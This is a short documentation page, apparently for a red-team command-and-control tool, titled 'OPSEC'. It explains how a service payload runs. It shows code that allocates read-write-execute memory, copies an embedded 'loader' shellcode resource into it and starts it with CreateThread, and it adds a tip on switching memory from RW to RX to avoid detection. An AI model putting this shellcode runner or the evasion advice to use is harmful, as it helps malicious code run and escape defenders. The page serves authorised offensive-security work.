+++
title = "OPSEC"
chapter = false
weight = 10
pre = "<b>1. </b>"
+++

### Service Execution
The service allocates local memory as RWX, loads the embedded resource into it, and kicks off execution. The service does _not_ do any remote process injection or migration.

```C++
public bool Execute()
{
    byte[] shellcode = GetResource("loader");
    UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
    IntPtr hThread = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr pinfo = IntPtr.Zero;
    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
    return true;
}
```

There is a potential OPSEC concern here related to the RWX memory. You can always go through to allocate RW memory, copy the code over, then change to RX before starting execution.